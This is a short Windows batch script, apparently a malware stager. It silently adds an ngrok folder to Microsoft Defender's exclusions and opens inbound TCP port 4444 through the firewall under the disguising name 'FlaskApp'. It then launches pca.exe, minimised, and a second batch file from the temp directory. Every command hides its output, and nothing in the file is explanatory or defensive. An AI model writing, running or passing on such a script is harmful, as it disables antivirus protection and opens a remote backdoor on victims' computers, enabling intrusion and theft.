@echo off
for /f "tokens=*" %%a in ('echo %USERNAME%') do set USERNAME=%%a
powershell -Command "$ngrokPath = 'C:\Users\%USERNAME%\AppData\Local\ngrok'; Add-MpPreference -ExclusionPath $ngrokPath" >nul 2>&1
powershell -Command "New-NetFirewallRule -DisplayName 'FlaskApp' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444 -Profile Any -EdgeTraversalPolicy Allow" >nul 2>&1
start /min "" "%temp%\pca.exe" 
start "" "%temp%\2.bat"
exit
